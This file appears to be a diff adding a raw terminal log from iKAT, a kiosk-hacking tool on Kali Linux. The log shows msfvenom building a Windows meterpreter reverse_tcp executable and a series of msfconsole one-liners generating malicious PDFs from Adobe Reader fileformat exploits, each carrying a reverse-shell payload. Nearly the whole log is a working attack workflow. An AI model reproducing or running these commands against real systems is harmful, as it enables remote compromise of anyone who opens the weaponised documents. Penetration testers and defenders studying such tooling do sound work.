@@ -1,0 +1,116 @@
+root@kali:# ikat
+
+  ;\   .__ ____  ___  ________________       
+ /  \  |__|    |/ _| /  _  \__    ___/       
+ \ _/  |  |      <  /  /_\  \|    |          
+  $^   |  |    |  \/    !    \    |            
+       |__|____|__ \____|____/_____\./_        
+                  |/               /'                  '
+                  
+          v2013 - Desktop Edition
+   Developed by the 'King of Kiosk Hacking'
+      Paul Craig - paul@ha.cked.net
+   ----------------------------------------
+
+       
+[+] Loading iKAT For Linux
+[+] Found network interface: 192.168.11.145
+[+] Found network interface: 127.0.0.1
+[+] Set config internet to 0
+[+] Validated all settings...
+[+] iKAT Server IP or port has changed.. Exploits need to be regenerated.
+[+] Regenerating Metasploit iKAT exploits for host 127.0.0.1 on port 1999
+[+] Generating Metasploit Exploits: 
+   [+]  -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 EXITFUNC=PROCESS -k -x '/usr/share/ikat/src/Windows/files/template.exe' -f exe >/usr/share/ikat/src/Windows/files/ikat.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Error: The following options failed to validate: EXITFUNC.
+  [+]  exploit/windows/fileformat/adobe_jbig2decode FILENAME=jbig2decode.1.102-5555.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+[+] /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_jbig2decode;set FILENAME jbig2decode.1.102-5555.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => jbig2decode.1.102-5555.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'jbig2decode.1.102-5555.pdf' file...
+[+] jbig2decode.1.102-5555.pdf stored at /root/.msf5/local/jbig2decode.1.102-5555.pdf
+  [+]  exploit/windows/fileformat/adobe_flashplayer_button FILENAME=adobe_flashplayer_button.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+[+] /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_flashplayer_button;set FILENAME adobe_flashplayer_button.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_flashplayer_button.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_flashplayer_button.pdf' file...
+[+] adobe_flashplayer_button.pdf stored at /root/.msf5/local/adobe_flashplayer_button.pdf
+  [+]  exploit/windows/fileformat/adobe_cooltype_sing FILENAME=adobe_cooltype_sing.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+[+] /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_cooltype_sing;set FILENAME adobe_cooltype_sing.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_cooltype_sing.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_cooltype_sing.pdf' file...
+[+] adobe_cooltype_sing.pdf stored at /root/.msf5/local/adobe_cooltype_sing.pdf
+  [+]  exploit/windows/fileformat/adobe_flashplayer_newfunction FILENAME=adobe_flashplayer_newfunction.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_flashplayer_newfunction;set FILENAME adobe_flashplayer_newfunction.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_flashplayer_newfunction.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_flashplayer_newfunction.pdf' file...
+[+] adobe_flashplayer_newfunction.pdf stored at /root/.msf5/local/adobe_flashplayer_newfunction.pdf
+  [+]  exploit/windows/fileformat/adobe_flatedecode_predictor02 FILENAME=adobe_flatedecode_predictor02.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_flatedecode_predictor02;set FILENAME adobe_flatedecode_predictor02.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_flatedecode_predictor02.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_flatedecode_predictor02.pdf' file...
+[+] adobe_flatedecode_predictor02.pdf stored at /root/.msf5/local/adobe_flatedecode_predictor02.pdf
+  [+]  exploit/windows/fileformat/adobe_geticon FILENAME=adobe_geticon.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_geticon;set FILENAME adobe_geticon.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_geticon.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_geticon.pdf' file...
+[+] adobe_geticon.pdf stored at /root/.msf5/local/adobe_geticon.pdf
+  [+]  exploit/windows/fileformat/adobe_jbig2decode FILENAME=adobe_jbig2decode PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_jbig2decode;set FILENAME adobe_jbig2decode;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_jbig2decode
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_jbig2decode' file...
+[+] adobe_jbig2decode stored at /root/.msf5/local/adobe_jbig2decode.bin
+  [+]  exploit/windows/fileformat/adobe_libtiff FILENAME=adobe_libtiff.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_libtiff;set FILENAME adobe_libtiff.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_libtiff.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_libtiff.pdf' file...
+[+] adobe_libtiff.pdf stored at /root/.msf5/local/adobe_libtiff.pdf
+  [+]  exploit/windows/fileformat/adobe_media_newplayer FILENAME=adobe_media_newplayer.pdf PAYLOAD=windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6082 E
+    [+]  /usr/share/metasploit-framework/msfconsole -q -x "use exploit/windows/fileformat/adobe_media_newplayer;set FILENAME adobe_media_newplayer.pdf;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 6082;run;quit"
+FILENAME => adobe_media_newplayer.pdf
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 127.0.0.1
+LPORT => 6082
+[*] Creating 'adobe_media_newplayer.pdf' file...
+[+] adobe_media_newplayer.pdf stored at /root/.msf5/local/adobe_media_newplayer.pdf
+ [-] Searching for file adobe_media_newplayer.pdf in directory /
+[-] Found adobe_media_newplayer.pdf at /root/.msf5/local/adobe_media_newplayer.pdf
+ [-] Searching for file adobe_media_newplayer.pdf in directory /
+[-] Found adobe_media_newplayer.pdf at /root/.msf5/local/adobe_media_newplayer.pdf
+[+] Set config generated_ip to 127.0.0.1
+[+] Set config port to 1999
+[+] Starting server iKAT on 127.0.0.1:1999 CTRL-C to terminate.
+[+] Internet access disabled
+[+] Starting Metasploit Server.
+[+] Starting iKAT Webserver..
+[28/Feb/2016:16:28:54] ENGINE Listening for SIGHUP.
+[28/Feb/2016:16:28:54] ENGINE Listening for SIGTERM.
+[28/Feb/2016:16:28:54] ENGINE Listening for SIGUSR1.
+[28/Feb/2016:16:28:54] ENGINE Bus STARTING
+[28/Feb/2016:16:28:54] ENGINE Started monitor thread '_TimeoutMonitor'.
+[28/Feb/2016:16:28:55] ENGINE Serving on 127.0.0.1:1999
+[28/Feb/2016:16:28:55] ENGINE Bus STARTED
